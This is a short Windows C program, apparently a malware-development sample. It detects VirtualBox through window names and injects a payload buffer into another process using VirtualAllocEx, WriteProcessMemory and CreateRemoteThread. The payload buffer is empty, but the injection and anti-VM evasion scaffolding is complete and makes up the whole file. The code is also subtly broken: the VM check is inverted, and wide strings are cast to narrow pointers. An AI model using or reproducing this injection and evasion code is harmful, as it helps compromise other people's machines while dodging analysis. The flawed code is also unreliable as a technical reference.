#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

unsigned char my_payload[] = "";

int main(int argc, char* argv[])
{
	HANDLE  ph; 
	HANDLE  rt;
	DWORD  pid;

	HWND   hcl = FindWindow((LPCSTR)L"VBoxTrayToolWndClass", NULL);
	HWND   hw  = FindWindow(NULL, (LPCSTR)L"VBoxTrayToolWnd");

	if (hcl || hw)
	{
		pid = atoi(argv[1]);
		ph  = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

		LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(ph, rb, my_payload, sizeof(my_payload), NULL);

		rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
		CloseHandle(ph);

		return 0;
	}
	else
	{
		printf("Virtualbox VM detected :(");
		return -2;
	}
}